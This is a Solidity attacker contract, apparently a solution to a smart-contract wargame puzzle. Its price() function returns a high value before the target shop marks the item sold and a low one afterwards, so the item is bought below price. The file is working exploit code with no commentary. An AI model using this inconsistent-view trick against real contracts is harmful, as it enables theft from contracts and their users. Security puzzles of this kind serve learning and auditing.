// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
} 

contract ShopAttacker {
    IShop public shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() external view returns (uint) {
        if (shop.isSold()) {
            return 50;
        } else {
            return 1000;
        }
    }

    function attack() external {
        shop.buy();
    }
}